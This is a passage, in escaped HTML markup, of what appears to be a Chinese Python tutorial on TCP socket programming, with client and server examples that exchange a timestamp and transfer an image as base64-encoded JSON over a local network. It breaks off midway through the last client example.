&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;socket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;datetime &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;datetime&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建套接字对象并指定使用哪种传输服务&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#AF_INET IPv4地址&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    server=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;family&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#同一时间在同一个端口只能绑定一个服务，否则报错&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    server.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bind&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;192.168.0.194&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6789&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    server.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;listen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;服务器开始监听&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过循环接收客户端的连接并为其提供服务&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#accept方法是一个阻塞方法，如果没有客户端连接到服务器，代码不会向下执行&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        client,addr=server.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;accept&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(addr)+&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;连接到了服务器.&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#发送数据&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(datetime.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;now&lt;&#x2F;span&gt;&lt;span&gt;()).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#断开连接&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;客户端&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;socket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;192.168.0.194&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6789&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;采用多线程编程优化服务端程序&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;socket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;datetime &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;datetime&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;base64 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;b64encode&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;json &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;dumps&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;FlieTran&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cclient&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.cclient=cclient&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            dict={}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filename&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;timg.jpeg&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#返回的图片通过json格式，json是纯文本，图片是二进制，所以需要做编码处理&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filedata&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]=data&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过dumps将字典处理成字符串&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            json_str=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dumps&lt;&#x2F;span&gt;&lt;span&gt;(dict)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#发送json字符串&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.cclient.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(json_str.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.cclient.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    server=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    server.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bind&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;192.168.0.109&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;49876&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    server.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;listen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;服务器启动监听&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;timg.jpeg&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#上面将图片通过json传输的时候做了utf8的编码，所以这里base64编码的对象就是经过utf8编码的json字符串&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        data=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b64encode&lt;&#x2F;span&gt;&lt;span&gt;(f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        client,addr=server.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;accept&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FlieTran&lt;&#x2F;span&gt;&lt;span&gt;(client).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;客户端代码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;socket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;json &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;base64 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;b64decode&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;((&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;192.168.0.109&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;49876&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#定义一个保存二进制数据的对象&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    in_data=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    data=client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;data:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        in_data+=data&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        data=client.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    my_dict=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(in_data.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    filename=my_dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;filename&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]&lt;&#x2F;span&gt;&lt;span&gt;
